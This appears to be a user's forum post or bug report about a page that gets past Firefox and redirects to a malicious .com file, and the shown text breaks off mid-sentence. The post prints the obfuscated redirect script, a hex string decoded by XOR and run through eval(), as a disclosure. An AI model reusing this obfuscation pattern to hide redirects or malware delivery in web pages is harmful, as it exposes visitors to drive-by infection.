Security hole, allows redirect to malicious .com file

Please don't follow the link if you don't have decent anti-virus software. F-Prot found the virus that Firefox let through.

Using fiddler I found that the above link doe a serious of redirects using obfuscated javascript (too complicated for me to understand).

The last redirect is with this code:

<script >YlSlzNpIGOj=new Function("REfIM","ISTPNJkDxKeaEsf='';for(gKFP=0;REfIM.length>gKFP;gKFP+=2)ISTPNJkDxKeaEsf+=String.fromCharCode(parseInt(REfIM.substr(gKFP,2),16)^195);return ISTPNJkDxKeaEsf");eval(YlSlzNpIGOj("aaa5ebada2b5aaa4a2b7acb1edb3afa2b7a5acb1aefefee494aaadf0f1e4eaafaca0a2b7aaacadedabb1a6a5fee4b4b4b4eda4acaca4afa6eda0acaee4"))</script >

That redirects to a .com file that my PC try to execute... and F-Prot luckily prevented that.

F-Prot give this message:
